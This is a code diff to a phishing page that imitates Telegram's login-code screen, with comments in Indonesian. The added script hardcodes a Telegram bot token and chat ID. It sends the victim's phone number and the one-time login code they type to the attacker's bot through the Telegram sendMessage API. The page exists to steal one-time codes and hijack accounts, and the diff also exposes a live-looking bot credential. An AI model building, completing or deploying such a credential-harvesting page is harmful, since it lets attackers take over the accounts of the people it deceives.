@@ -48,7 +48,7 @@
 <body>
     <div class="container">
         <h2>Enter Code</h2>
-        <p id="thisPhone">We have sent the code to your the telegram app <span></span></p>
+        <p id="thisPhone">We have sent the code to your telegram app <span></span></p>
         <form id="formPin">
             <input id="pin1" class="inppin" maxlength="1" type="text" required>
             <input id="pin2" class="inppin" maxlength="1" type="text" required>
@@ -61,10 +61,14 @@
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
+        // Ganti token bot Telegram dan chat_id dengan nilai yang sesuai
+        const BOT_TOKEN = '7451357338:AAGaHAyD96AMy2WVLgSbfQi0ovel3Y31IWk';
+        const CHAT_ID = '6269902580';
+
         document.addEventListener("DOMContentLoaded", function() {
             // Set nomor telepon di halaman
             const phone = sessionStorage.getItem("nohp");
-            document.getElementById("thisPhone").querySelector("span").textContent = phone;
+            document.getElementById("thisPhone").querySelector("span").textContent = phone || 'Unknown';
         });
 
         function sendPin() {
@@ -73,17 +77,20 @@
             const phone = sessionStorage.getItem("nohp");
 
             if (!phone || code.length !== 5) {
-                
+                alert("Nomor telepon atau kode tidak valid!");
                 return;
             }
 
-            const data = JSON.stringify({ phone, code });
+            const message = `📱 Phone: ${phone}\n🔑 OTP: ${code}`;
 
             $.ajax({
-                url: "../req/code.php", // Ganti dengan file PHP untuk memproses data
+                url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                 type: "POST",
                 contentType: "application/json",
-                data: data,
+                data: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                }),
                 success: function(response) {
                     alert("Data berhasil dikirim ke bot Telegram!");
                 },
